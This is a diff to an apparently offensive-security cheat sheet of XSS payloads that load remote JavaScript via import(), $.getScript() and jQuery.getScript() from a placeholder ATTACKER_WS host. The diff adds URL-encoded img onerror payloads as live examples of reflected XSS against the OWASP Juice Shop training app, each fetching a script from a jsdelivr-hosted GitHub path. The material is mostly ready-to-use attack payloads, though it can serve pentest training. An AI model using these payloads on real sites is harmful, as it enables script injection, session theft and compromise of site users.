@@ -18,17 +18,29 @@
 import('//ATTACKER_WS/PATH/JS_PAYLOAD');
 ```
 
+* *(live example - OWASP juice shop - reflected XSS)*
+
+    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22import(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
+
 ## [jQuery; new] `$.getScript()` - round brackets; quote; dollar
 
 ```
 $.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
 ```
 
+* *(live example - OWASP juice shop - reflected XSS)*
+
+    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22%24.getScript(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
+
 ## [jQuery; old] `jQuery.getScript()` - round brackets; quote
 
 ```
 jQuery.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
 ```
+
+* *(live example - OWASP juice shop - reflected XSS)*
+
+    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22jQuery.getScript(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
 
 ## `appendChild()` #1 - round brackets; quote; equal
 
